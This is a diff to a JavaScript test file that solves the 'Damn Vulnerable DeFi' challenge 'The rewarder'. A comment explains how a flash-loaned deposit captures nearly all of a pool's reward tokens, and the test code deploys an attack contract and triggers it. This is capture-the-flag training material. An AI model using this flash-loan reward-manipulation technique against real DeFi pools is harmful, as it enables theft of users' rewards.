@@ -19,6 +19,7 @@ describe('[Challenge] The rewarder', function () {
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
+        
 
         this.liquidityToken = await DamnValuableTokenFactory.deploy();
         this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
@@ -29,6 +30,7 @@ describe('[Challenge] The rewarder', function () {
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
         this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+        
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
@@ -65,7 +67,48 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
+        /**
+         * @dev
+         * The amount of rewards distributed to a user is calculated based on their share of DVT tokens in the pool.
+         * Alice, Bob, Charlie and David have all deposited the same amount of tokens, each of them owns 25% of the DVTs in the pool, so their reward is 25 Reward Tokens each.
+         * Our goal is to get as close to 100 Reward tokens as possible. To do so, we need to deposit enough DVT tokens so that our share of DVT in the pool is close to 100%.
+         * This where the contract is flawed: there is no upper limit on the amount of DVT tokens we can deposit. A DVT "whale" can deposit an amount of DVT tokens significantly larger than what was currently in the pool, and claim most of the reward tokens for themselves.
+         * That FlashLoaner Pool allows us to borrow up to 1 million tokens: if we then deposit this amount in the pool, our share will be: 1,000,000 / 1,000,400 ~ 99.96 %
+         * -> We will receive 99.96 Reward tokens.
+         * Then, we just have to withdraw our DVT tokens to transfer them back to the flashLoan pool to complete the flash loan.
+         * 
+         * NB It is not exactly accurate to call it a "flaw", the pool rewarding system does function as intended. But a rewards system based on the tokens share in the pool requires several key strategic decisions to ensure it incentivizes users to deposit in the pool. One of them is to keep the allowance distributed: would you want to deposit tokens in a pool where 99.99% is owned by a single person?
+         */
         /** CODE YOUR EXPLOIT HERE */
+        const RewarderAttackFactory = await ethers.getContractFactory(
+          'RewarderAttack',
+          deployer
+        );
+        this.attackerContract = await RewarderAttackFactory.deploy(
+          this.flashLoanPool.address,
+          this.rewarderPool.address,
+          this.liquidityToken.address,
+          this.rewardToken.address,
+          attacker.address
+        );
+        //
+        await ethers.provider.send('evm_increaseTime', [6 * 24 * 60 * 60]);
+        let attackerReward1 = await this.rewardToken.balanceOf(attacker.address);
+        console.log(
+          `\u001b[1;33mThe attacker starts with ${ethers.utils.formatEther(
+            attackerReward1
+          )} Reward tokens`
+        );
+        
+        console.log(`\u001b[1;35mStarting the attack`);
+        await this.attackerContract.attack(TOKENS_IN_LENDER_POOL);
+
+        let attackerReward2 = await this.rewardToken.balanceOf(attacker.address);
+        console.log(
+          `\u001b[1;33mThe attacker now has ${ethers.utils.formatEther(
+            attackerReward2
+          )} Reward tokens`
+        );
     });
 
     after(async function () {
